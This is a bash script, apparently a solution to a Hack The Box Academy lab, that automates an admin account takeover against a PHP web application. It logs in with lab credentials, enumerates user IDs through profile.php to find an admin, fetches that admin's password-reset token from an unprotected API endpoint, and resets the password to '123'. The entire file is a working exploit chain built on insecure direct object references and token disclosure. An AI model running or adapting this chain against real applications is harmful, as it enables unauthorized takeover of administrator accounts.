#!/bin/bash

# Target configuration
TARGET="http://94.237.55.43:50149"
LOGIN_URL="$TARGET/index.php"
CREDS="username=htb-student&password=Academy_student%21"

# Static credentials
COOKIE_FILE="/tmp/cookies.txt"

echo "[*] Authenticating with static credentials..."
# Perform login and save cookies
curl -s -v -X POST "$LOGIN_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0" \
  -H "Referer: $TARGET/" \
  -d "$CREDS" \
  -c $COOKIE_FILE -b $COOKIE_FILE > /dev/null 2>&1

# Check if login succeeded by looking for PHPSESSID
if [ ! -s $COOKIE_FILE ] || ! grep -q "PHPSESSID" $COOKIE_FILE; then
  echo "[-] Authentication failed!"
  exit 1
fi

echo "[+] Authentication successful - Cookie stored"

# Part 1: Scan user IDs from 1 to 100 to find admin
echo "[*] Scanning users 1-100 for admin..."
ADMIN_UID=""

for id in {1..100}; do
  username=$(curl -s -b $COOKIE_FILE "$TARGET/profile.php?uid=$id" | grep -oP "username: \K.*")
  
  if [[ -n "$username" ]]; then
    echo "[+] Found UID $id: $username"
    
    # Check if this is admin (case insensitive match)
    if [[ "$username" =~ [aA][dD][mM][iI][nN] ]]; then
      ADMIN_UID=$id
      echo "[+] ADMIN FOUND: UID $ADMIN_UID"
      break
    fi
  fi
done

if [[ -z "$ADMIN_UID" ]]; then
  echo "[-] Admin not found in UIDs 1-100"
  exit 1
fi

# Part 2: Get token for admin using authenticated session
echo "[*] Getting token for admin (UID $ADMIN_UID)..."
ADMIN_TOKEN=$(curl -s -b $COOKIE_FILE "$TARGET/api.php/token/$ADMIN_UID" | jq -r '.token')

if [[ -z "$ADMIN_TOKEN" ]]; then
  echo "[-] Failed to get admin token"
  exit 1
fi

echo "[+] Admin Token: $ADMIN_TOKEN"

# Part 3: Reset admin password using authenticated session
echo "[*] Resetting admin password to '123'..."
reset_response=$(curl -s -v -b $COOKIE_FILE \
  "$TARGET/reset.php?uid=$ADMIN_UID&token=$ADMIN_TOKEN&password=123" 2>&1)

if echo "$reset_response" | grep -q "Password reset successful"; then
  echo "[+] PASSWORD RESET SUCCESSFUL"
  echo "    Admin UID: $ADMIN_UID"
  echo "    New password: 123"
else
  echo "[-] Password reset failed"
  echo "    Response:"
  echo "$reset_response" | head -n 20
fi

# Clean up
rm -f $COOKIE_FILE
